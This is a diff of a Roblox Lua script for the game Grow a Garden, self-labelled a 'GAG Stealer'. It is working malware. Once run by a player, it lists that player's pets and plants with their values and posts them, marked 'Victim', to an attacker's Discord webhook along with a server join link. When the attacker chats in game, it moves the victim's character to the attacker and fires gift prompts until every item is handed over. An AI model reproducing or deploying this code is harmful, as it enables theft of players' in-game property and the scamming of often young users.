@@ -1,6 +1,10 @@
+-- GROWAGARDEN HIT by namnnni2
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
 local dataService = require(modules:WaitForChild("DataService"))
@@ -9,57 +13,41 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
-local backpack = plr:WaitForChild("Backpack")
-local character = plr.Character or plr.CharacterAdded:Wait()
+-- Settings
+local webhook = getfenv()["Webhook"]
+local username = getfenv()["Username"]
 
--- Lấy từ settings ngoài
-local webhook = Webhook
-local users = {Username}
+if not webhook or not username then return warn("Missing Webhook or Username") end
 
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+
 local itemsToSend = {}
 local totalValue = 0
 local hasRare = false
 local hasHeavy = false
 
-local function formatNumber(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
+local function formatNumber(num)
+	local suffix = {"", "k", "m", "b", "t"}
+	local i = 1
+	while num >= 1000 and i < #suffix do
+		num = num / 1000
+		i = i + 1
 	end
-	if suffixIndex == 1 then
-		return tostring(math.floor(number))
-	else
-		return string.format("%.2f%s", number, suffixes[suffixIndex])
-	end
+	return string.format("%.2f%s", num, suffix[i])
 end
 
-local function getWeight(tool)
-	local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
-	if weightValue then
-		return tonumber(weightValue.Value) or 0
-	end
-	local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
-	return tonumber(match) or 0
-end
-
-local function calcPetValue(petData)
-	local hatchedFrom = petData.PetData.HatchedFrom
-	if not hatchedFrom then return 0 end
-	local eggData = petRegistry.PetEggs[hatchedFrom]
+local function calcPetValue(data)
+	local egg = data.PetData.HatchedFrom
+	local eggData = petRegistry.PetEggs[egg]
 	if not eggData then return 0 end
-	local rarityData = eggData.RarityData.Items[petData.PetType]
-	if not rarityData then return 0 end
-	local weightRange = rarityData.GeneratedPetData.WeightRange
-	local ratio = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
-	local scale = math.lerp(0.8, 1.2, ratio)
-	local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
-	local finalMultiplier = scale * math.lerp(0.15, 6, levelProgress)
-	local basePrice = petRegistry.PetList[petData.PetType].SellPrice
-	return math.floor(basePrice * finalMultiplier)
+	local rarity = eggData.RarityData.Items[data.PetType]
+	if not rarity then return 0 end
+	local range = rarity.GeneratedPetData.WeightRange
+	local lerp = numberUtil.ReverseLerp(range[1], range[2], data.PetData.BaseWeight)
+	local wMult = math.lerp(0.8, 1.2, lerp)
+	local lMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(data.PetData.Level))
+	return math.floor(petRegistry.PetList[data.PetType].SellPrice * wMult * lMult)
 end
 
 for _, tool in ipairs(backpack:GetChildren()) do
@@ -67,92 +55,105 @@ for _, tool in ipairs(backpack:GetChildren()) do
 		if tool:GetAttribute("ItemType") == "Pet" then
 			local uuid = tool:GetAttribute("PET_UUID")
 			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
-			local petName = petData.PetType
+			local weight = tonumber(petData.PetData.BaseWeight) or 0
+			local name = petData.PetType
 			local value = calcPetValue(petData)
-			local weight = getWeight(tool)
-
-			if table.find(rarePets, petName) then hasRare = true end
 			if weight >= 10 then hasHeavy = true end
-
+			if table.find(rarePets, name) then hasRare = true end
 			totalValue += value
-			table.insert(itemsToSend, {
-				Name = petName,
-				Weight = weight,
-				Value = value,
-				Type = "Pet"
-			})
+			table.insert(itemsToSend, {Tool = tool, Name = name, Weight = weight, Value = value, Type = "Pet"})
 		else
 			local value = calcPlantValue(tool)
-			local weight = getWeight(tool)
-			local itemName = tool:GetAttribute("ItemName") or tool.Name
-
 			totalValue += value
-			table.insert(itemsToSend, {
-				Name = itemName,
-				Weight = weight,
-				Value = value,
-				Type = "Plant"
-			})
+			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
 		end
 	end
 end
 
+if #itemsToSend == 0 then return end
+
 table.sort(itemsToSend, function(a, b)
-	if a.Type == "Pet" and b.Type ~= "Pet" then
-		return true
-	elseif a.Type ~= "Pet" and b.Type == "Pet" then
-		return false
-	else
-		return a.Value > b.Value
-	end
+	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
+	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
+	return a.Value > b.Value
 end)
 
-local contentPrefix = ""
-if hasRare or hasHeavy then
-	contentPrefix = "@everyone "
-end
+-- Send Webhook
+local content = (hasRare or hasHeavy) and "@everyone\n" or ""
+content = content .. "**JobId:** `" .. game.JobId .. "`"
 
-local itemLines = ""
+local itemText = ""
 for _, item in ipairs(itemsToSend) do
-	itemLines = itemLines .. string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+	itemText ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+	if #itemText > 1024 then
+		itemText = itemText:sub(1, 1010) .. "\n...more items"
+		break
+	end
 end
-
-if #itemLines > 1024 then
-	itemLines = itemLines:sub(1, 1010) .. "\n...more items"
-end
-
-local data = {
-	content = contentPrefix,
-	embeds = {{
-		title = "🎯 Full Inventory Report",
-		color = 65280,
-		fields = {
-			{
-				name = "Victim:",
-				value = plr.Name,
-				inline = true
-			},
-			{
-				name = "Total Value:",
-				value = "₵" .. formatNumber(totalValue),
-				inline = true
-			},
-			{
-				name = "Item List:",
-				value = itemLines
-			}
-		},
-		footer = {
-			text = "GAG Stealer by namnnni2"
-		}
-	}}
-}
 
 pcall(function()
-	http_request({
-		Url = webhook,
-		Method = "POST",
-		Headers = {["Content-Type"] = "application/json"},
-		Body = HttpService:JSONEncode(data)
-	})
+	HttpService:PostAsync(webhook, HttpService:JSONEncode({
+		content = content,
+		embeds = {{
+			title = "🎯 GROWAGARDEN HIT by namnnni2",
+			color = 65280,
+			fields = {
+				{name = "Victim", value = plr.Name, inline = true},
+				{name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+				{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId},
+				{name = "Items", value = itemText}
+			},
+			footer = {text = "GAG Stealer by " .. username}
+		}}
+	}), Enum.HttpContentType.ApplicationJson)
+end)
+
+-- Follow & Steal when target user chats
+local function stealFrom(target)
+	local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+	local other = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+	if not (root and other) then return end
+
+	while true do
+		root.CFrame = other.CFrame + Vector3.new(0, 0, 2)
+		task.wait(0.1)
+	end
+end
+
+local function giftItems(target)
+	local root = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+	local prompt = root and root:FindFirstChildWhichIsA("ProximityPrompt", true)
+	if not prompt then return end
+
+	for _, item in ipairs(itemsToSend) do
+		item.Tool.Parent = plr.Character
+		repeat task.wait(0.05) until prompt.Enabled
+		fireproximityprompt(prompt)
+		repeat task.wait(0.1) until not backpack:FindFirstChild(item.Tool.Name)
+		task.wait(0.1)
+	end
+end
+
+for _, p in pairs(Players:GetPlayers()) do
+	if p.Name == username then
+		p.Chatted:Connect(function()
+			task.spawn(function()
+				stealFrom(p)
+			end)
+			task.wait(1)
+			giftItems(p)
+		end)
+	end
+end
+
+Players.PlayerAdded:Connect(function(p)
+	if p.Name == username then
+		p.Chatted:Connect(function()
+			task.spawn(function()
+				stealFrom(p)
+			end)
+			task.wait(1)
+			giftItems(p)
+		end)
+	end
 end)
